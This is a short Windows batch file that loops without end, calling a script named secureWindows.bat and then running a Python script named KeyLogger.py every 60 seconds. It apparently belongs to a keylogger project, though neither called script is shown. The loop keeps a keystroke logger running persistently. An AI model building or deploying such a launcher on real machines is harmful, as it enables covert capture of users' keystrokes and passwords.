@echo off
rem Turn off command echoing to keep the output clean

:loop
rem Start the process of calling secureWindows.bat
call secureWindows.bat

rem Run the Python script for KeyLogger
python3 KeyLogger.py 

rem Wait for 60 seconds before repeating the loop
timeout /t 60 /nobreak > nul

rem Go back to the start of the loop and repeat
goto loop
